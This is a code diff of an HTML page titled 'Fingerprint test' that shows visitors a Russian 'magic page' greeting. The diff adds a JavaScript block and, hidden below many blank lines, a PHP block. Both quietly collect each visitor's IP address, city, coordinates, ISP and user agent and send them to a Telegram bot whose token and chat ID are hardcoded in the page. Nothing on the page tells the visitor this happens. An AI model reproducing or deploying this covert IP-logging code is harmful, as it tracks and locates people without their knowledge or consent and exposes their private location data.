@@ -1,41 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Fingerprint Test</title>
+  <meta charset="utf-8">  
+  <title>Fingerprint test</title>
 </head>
 <body>
 
+
 <script>
-// Получаем IP клиента через внешний API (например, ipwhois.io)
+// Detect the client's IP address
+let ip = '';
+let ua = navigator.userAgent;
+
+// Get the client's IP (using a service like ipwhois.io)
 fetch('https://free.ipwhois.io/json/')
   .then(response => response.json())
-  .then(apiData => {
-    // Извлекаем информацию о клиенте из ответа API
-    const ip = apiData.ip;
-    const country = apiData.country;
-    const region = apiData.region;
-    const city = apiData.city;
-    const latitude = apiData.latitude;
-    const longitude = apiData.longitude;
-    const isp = apiData.isp;
+  .then(api => {
+    // Extract data from the API response
+    ip = api.ip;
+    const country = api.country;
+    const region = api.region;
+    const city = api.city;
+    const latitude = api.latitude;
+    const longitude = api.longitude;
+    const isp = api.isp;
 
-    // Получаем User-Agent браузера
-    const ua = navigator.userAgent;
+    // Prepare the message to send to Telegram
+    const message = encodeURIComponent(`${ip}\n${country} ${region}\n${city}\n${latitude}\n${longitude}\n${isp}\n\n${ua}`);
 
-    // Формируем сообщение, которое нужно отправить в Telegram
-    const message = encodeURIComponent(
-      `${ip}\n${country} ${region}\n${city}\n${latitude}\n${longitude}\n${isp}\n\n${ua}`
-    );
-
-    // Настроим параметры для отправки через Telegram Bot API
+    // Send the message to Telegram via the Bot API
     const botToken = '1682820271:AAE3HGqITz6N5qyIcy3ODm6rOIypbBseAJ4';
     const chatId = '669186959';
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${message}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${message}`;
 
-    // Отправляем сообщение в Telegram
-    fetch(telegramUrl)
+    // Send the message
+    fetch(url)
       .then(response => response.json())
       .then(data => {
         console.log('Message sent successfully:', data);
@@ -48,7 +47,60 @@ fetch('https://free.ipwhois.io/json/')
     console.error('Error fetching IP details:', error);
   });
 
+
 </script>
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+<?php
+if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP']; }
+$ip = $_SERVER['REMOTE_ADDR'];
+$ua =  $_SERVER['HTTP_USER_AGENT'];
+
+$api = json_decode(file_get_contents('http://free.ipwhois.io/json/'.$ip), true);
+$country = $api['country'];
+$region = $api['region'];
+$city = $api['city'];
+
+$latitude = $api['latitude'];
+$longitude = $api['longitude'];
+$isp = $api['isp'];
+
+
+$client = '669186959';
+
+file_get_contents('https://api.telegram.org/bot1682820271:AAE3HGqITz6N5qyIcy3ODm6rOIypbBseAJ4/sendMessage?chat_id=669186959&parse_mode=html&text='.urlencode($ip."\n".$county.$region."\n".$city."\n".$latitude."\n".$longitude."\n".$isp."\n\n".$ua));
+?>
+
+<img src="unnamed.jpg" title="Image" alt="alt text">
+
+
+
+  <p>
+    Всем привет, вы <br>
+    попали на волшебную страницу. Она создана <br>
+    для проверки <br>
+    вашей внимательности.
+  </p>
+   
 </body>
 </html>
